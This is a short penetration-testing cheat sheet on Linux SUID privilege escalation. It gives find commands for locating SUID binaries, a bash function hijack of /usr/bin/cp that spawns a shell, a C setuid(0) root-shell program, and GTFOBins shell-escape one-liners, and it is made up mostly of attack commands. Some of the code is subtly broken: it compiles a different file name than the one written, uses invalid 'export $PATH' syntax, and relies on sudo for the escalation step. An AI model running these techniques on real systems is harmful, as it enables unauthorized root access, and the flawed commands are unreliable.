## SUID

### How to Find SUIDs?

To find SUID that may be useful then execute the following commands:

```
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
find / -uid 0 -perm -4000 -type f 2>/dev/null
```

For example, an output could be:

```
bash-4.2$ find / -user root -perm -4000 -print 2> /dev/null
find / -user root -perm -4000 -print 2> /dev/null
/usr/bin/mount
/usr/bin/chage
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/su
/usr/bin/update_my_docs
[... reduced ...]
````

If we'll check the /usr/bin/update_my_docs we'll see it's running under root ownership:

```
bash-4.2$: ls /usr/bin/update_my_docs -alh                  
-rwsr-xr-x 1 root root 138K 23 nov.  16:04 /usr/bin/update_my_docs
```

### Exploiting SUID

For some unix binaries that can be exploited you may find in GTFOBins project.
For custome-made binaries the process may be as following:

#### Bash Function Manipulation

In this techniques, we'll create/export a bash function matching one of the programs called by the program (i.e., "/usr/bin/cp"):

```
function /usr/bin/cp(){ /bin/sh; }
export -f /usr/bin/cp
```

Then we'll execute our program /usr/bin/update_my_docs to get our shell.

#### Create Binary SUID

In this trick, we'll create a SUID bianry as following:

```
echo -e '#include <stdio.h>\n#include <sys/types.h>\n#include <unistd.h>\n\nint main(void){\n\tsetuid(0);\n\tsetgid(0);\n\tsystem("/bin/bash");\n}' > /tmp/setuid.c
gcc -o /tmp/suid /tmp/suid.c  
sudo chmod +x /tmp/suid # execute right
sudo chmod +s /tmp/suid # setuid bit
```

Place it in our $PATH using the command:

```
export $PATH=/tmp:$PATH
```

Then execute our binary to get shell as root.

#### GTFOBins 

GTFOBins is a list of UNIX binaries that can be exploited to bypass local security restrictions. Those binaries can be abused to escape restricted shells, spawn remote shells, elevate privlieges 
and more. 

A few examples: 

``` 
awk 'BEGIN {system("/bin/sh")}'
sudo find . -exec /bin/sh \; -quit
```

For more acurated list: https://gtfobins.github.io/gtfobins/
